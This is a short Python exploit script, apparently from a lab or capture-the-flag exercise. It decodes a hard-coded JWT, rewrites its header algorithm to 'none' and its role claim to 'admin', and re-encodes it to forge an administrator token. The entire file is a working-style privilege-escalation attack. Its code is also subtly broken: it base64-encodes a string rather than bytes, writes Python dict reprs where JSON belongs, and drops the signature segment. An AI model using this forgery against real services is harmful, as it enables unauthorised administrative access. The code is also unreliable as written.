from base64 import b64decode, b64encode
import json

ENC = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjU5MDUyMDgwMTE1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NTkwNTIwODB9.DOnEIxtQ9SqwP8YdXxd1LhOePBdr1iWremjaYNr904g"

class Exploit:
    def __init__(self, enc=ENC):
        self.enc = enc
        self.decoded_jwt = self.decode_jwt(enc)
        
    def decode_jwt(self, enc: str):
        enc_split = enc.split('.')
        decoded = b64decode(enc_split[0]).decode()
        decoded +="."
        decoded += b64decode(enc_split[1]).decode()
        return decoded
    
    def encode_jwt(self, dec: str):
        dec_split = dec.split('.')
        encoded = b64encode(dec_split[0].encode()).decode()
        encoded +="."
        encoded += b64encode(".".join(dec_split[1::2])).decode()
        return encoded
    
    def change_alg_n_role(self, jwt: str):
        jwt_split = jwt.split(".")
        
        json_alg = jwt_split[0]
        json_alg = json.loads(json_alg)
        
        json_role = '.'.join(jwt_split[1:])
        json_role = json.loads(json_role)
        
        
        json_alg['alg'] = "none"
        json_role['role'] = "admin"
        
        # print(json_alg)
        # print(json_role)

        return str(json_alg)+"."+str(json_role)
        
    def start(self):
        change = self.change_alg_n_role(self.decoded_jwt)
        encode = self.encode_jwt(dec=change)
        return encode
        
    

dec = Exploit().start()

print(dec)